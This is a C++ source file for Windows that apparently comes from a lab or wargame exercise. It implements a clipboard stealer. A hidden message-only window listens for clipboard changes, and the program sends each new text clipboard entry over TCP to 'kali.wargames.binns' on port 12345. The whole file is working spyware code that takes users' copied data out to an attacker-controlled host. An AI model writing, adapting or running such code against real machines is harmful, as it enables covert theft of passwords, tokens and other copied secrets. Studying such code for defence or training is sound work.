#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <string>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <WinUser.h>

#pragma comment(lib, "Ws2_32.lib")

bool sendClipboard(char* clipboardData);
LRESULT CALLBACK ClipboardEventProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM  lParam);

int main()
{

    WNDCLASSEX wndClass = { sizeof(WNDCLASSEX) };
    wndClass.lpfnWndProc = ClipboardEventProc;
    wndClass.lpszClassName = L"ClipWnd";
    if (!RegisterClassEx(&wndClass)) {
        std::cout << "RegisterClassEx Error: 0x%08X" << GetLastError() << std::endl;
        return 1;
    }
    //Message only window is not viewable or enumeratable but can act as a message recv and pump
    HWND hWnd = CreateWindowEx(0, wndClass.lpszClassName, L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
    if (!hWnd) {
        std::cout << "CreateWindowEx Error: 0x%08X" << GetLastError() << std::endl;
        return 1;
    }

    MSG msg;
    while (BOOL bRet = GetMessage(&msg, 0, 0, 0)) {
        if (bRet == -1) {
            std::cout << "GetMessage Error: 0x%08X" << GetLastError() << std::endl;
            return 3;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;

}

bool sendClipboard(char* clipboardData)
{
    WSADATA wsaData;

    int iResult;

    //Request winsock version 2.2
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cout << "Unable to perform WSAStartup: " << iResult << std::endl;
        return false;
    }
    
    struct addrinfo 
        *result = NULL,
        *ptr = NULL,
        hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("kali.wargames.binns", "12345", &hints, &result);
    if (iResult != 0) {
        std::cout << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return false;
    }

    SOCKET conn = INVALID_SOCKET;
    ptr = result;
    conn = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

    if (conn == INVALID_SOCKET) {
        std::cout << "Invalid Socket: " << WSAGetLastError();
        freeaddrinfo(result);
        WSACleanup();
        return false;
    }

    iResult = connect(conn, ptr->ai_addr, (int)ptr->ai_addrlen);
    // You could try the next address returned from getaddrinfo
    if (iResult == SOCKET_ERROR) {
        closesocket(conn);
        conn = INVALID_SOCKET;
        freeaddrinfo(result);
    }

    if (conn == INVALID_SOCKET) {
        std::cout << "Unable to connect to server" << std::endl;
        WSACleanup();
        return false;
    }

    iResult = send(conn, clipboardData, strlen(clipboardData), 0);
    if (iResult == SOCKET_ERROR) {
        std::cout << "send failed" << WSAGetLastError() << std::endl;
        closesocket(conn);
        WSACleanup();
        return false;
    }

    //Kills it for sending, but can still receive if we need to
    iResult = shutdown(conn, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        std::cout << "shutdown send failed" << WSAGetLastError() << std::endl;
        closesocket(conn);
        WSACleanup();
        return false;
    }
    closesocket(conn);
    WSACleanup();
    return true;

}

LRESULT CALLBACK ClipboardEventProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM  lParam)
{
    BOOL bListening = false;
    switch (msg){
    case WM_CREATE:
        bListening = AddClipboardFormatListener(hwnd);
        return bListening ? 0 : -1;
    case WM_DESTROY:
        if (bListening) {
            RemoveClipboardFormatListener(hwnd);
            bListening = false;
        }
        return 0;
    case WM_CLIPBOARDUPDATE:
        std::cout << "Clipboard Update" << std::endl;
        //Opens the clipboard an allows examination
        if (!OpenClipboard(NULL)) {
            std::cout << "Unable to open clipboard" << std::endl;
            return 1;
        }

        HANDLE hClipboard = GetClipboardData(CF_TEXT);
        if (hClipboard == NULL) {
            std::cout << "Unable to get a handle to the clipboard" << std::endl;
            CloseClipboard();
            return 1;
        }

        char* pClipboardData = (char*)GlobalLock(hClipboard);

        if (pClipboardData == NULL) {
            std::cout << "Failed to lock clipboard" << std::endl;
            CloseClipboard();
            return 1;
        }

        std::cout << "Clipboard: " << pClipboardData << std::endl;
        sendClipboard(pClipboardData);
        GlobalUnlock(hClipboard);
        CloseClipboard();
        return 0;
    }

    return DefWindowProc(hwnd, msg, wParam, lParam);
}